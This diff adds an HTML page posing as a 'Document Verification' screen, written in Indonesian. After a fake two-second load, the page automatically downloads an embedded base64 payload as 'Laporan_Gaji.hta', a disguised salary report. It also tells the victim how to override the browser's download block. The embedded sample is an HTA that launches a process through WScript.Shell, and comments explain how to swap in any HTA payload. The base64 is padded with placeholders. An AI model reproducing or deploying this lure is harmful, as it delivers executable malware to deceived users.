@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Document Verification</title>
+    <style>
+        body {
+            font-family: Segoe UI, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background: #f0f0f0;
+        }
+
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .box {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="box">
+        <div class="loader"></div>
+        <h2>Memverifikasi Dokumen...</h2>
+        <p>File akan diunduh secara otomatis jika verifikasi berhasil.</p>
+        <p style="color: red; font-size: 12px;">Jika unduhan diblokir, tekan Ctrl+J dan pilih "Keep".</p>
+    </div>
+
+    <script>
+        function base64ToArrayBuffer(base64) {
+            var binaryString = window.atob(base64);
+            var binaryLen = binaryString.length;
+            var bytes = new Uint8Array(binaryLen);
+            for (var i = 0; i < binaryLen; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            return bytes;
+        }
+
+        // DISINI ANDA MASUKKAN BASE64 DARI FILE HTA ANDA
+        // Gunakan tools online untuk convert file .hta ke base64 string
+        var fileBase64 = "PGh0bWw+.....(PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgIDx0aXRsZT5IVEEgQ2FsY3VsYXRvciBQb0M8L3RpdGxlPg0KICAgIDxodGE6YXBwbGljYXRpb24NCiAgICAgICAgaWQ9Im9NeUFwcCINCiAgICAgICAgYXBwbGljYXRpb25OYW1lPSJDYWxjIExhdW5jaGVyIg0KICAgICAgICBib3JkZXI9InRoaWNrIg0KICAgICAgICBib3JkZXJTdHlsZT0iZGlhbG9nIg0KICAgICAgICBzeXNtZW51PSJ5ZXMiDQogICAgICAgIHNob3dJblRhc2tiYXI9InllcyINCiAgICAgICAgc2luZ2xlSW5zdGFuY2U9InllcyINCiAgICAgICAgd2luZG93U3RhdGU9Im5vcm1hbCINCiAgICAvPg0KICAgIDxzdHlsZT4NCiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiBjb25zb2xhcywgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogIzFlMWUxZTsgY29sb3I6ICNkNGQ0ZDQ7IH0NCiAgICAgICAgYnV0dG9uIHsgcGFkZGluZzogMTVweDsgYmFja2dyb3VuZC1jb2xvcjogIzBlNjM5YzsgY29sb3I6IHdoaXRlOyBib3JkZXI6IG5vbmU7IGN1cnNvcjogcG9pbnRlcjsgfQ0KICAgICAgICBidXR0b246aG92ZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMTE3N2JiOyB9DQogICAgPC9zdHlsZT4NCiAgICANCiAgICA8c2NyaXB0IGxhbmd1YWdlPSJKYXZhU2NyaXB0Ij4NCiAgICAgICAgZnVuY3Rpb24gc3Bhd25DYWxjKCkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAvLyBJbnN0YW5zaWFzaSBvYmplayBXU2NyaXB0LlNoZWxsDQogICAgICAgICAgICAgICAgdmFyIHNoZWxsID0gbmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsNCiAgICAgICAgICAgICAgICAvLyBNZW5qYWxhbmthbiBjYWxjLmV4ZQ0KICAgICAgICAgICAgICAgIHNoZWxsLlJ1bigiY2FsYy5leGUiKTsNCiAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgICAgICAgICBhbGVydCgiR2FnYWwgbWVuamFsYW5rYW46ICIgKyBlLm1lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgPC9zY3JpcHQ+DQo8L2hlYWQ+DQo8Ym9keT4NCiAgICA8aDE+UHJvb2Ygb2YgQ29uY2VwdDwvaDE+DQogICAgPHA+S2xpayB0b21ib2wgZGkgYmF3YWggdW50dWsgbWVtYW5nZ2lsIGNoaWxkIHByb2Nlc3MgKGNhbGMuZXhlKS48L3A+DQogICAgDQogICAgPGJ1dHRvbiBvbmNsaWNrPSJzcGF3bkNhbGMoKTsiPlNwYXduIENhbGN1bGF0b3I8L2J1dHRvbj4NCjwvYm9keT4NCjwvaHRtbD4=).....PC9odG1sPg==";
+
+        var fileName = "Laporan_Gaji.hta";
+
+        function downloadFile() {
+            var data = base64ToArrayBuffer(fileBase64);
+            var blob = new Blob([data], { type: "application/hta" });
+
+            // Trik untuk trigger download otomatis
+            var link = document.createElement('a');
+            link.href = window.URL.createObjectURL(blob);
+            link.download = fileName;
+            link.click();
+        }
+
+        // Jalankan download setelah 2 detik (biar terlihat seperti loading)
+        setTimeout(downloadFile, 2000);
+    </script>
+</body>
+
+</html>
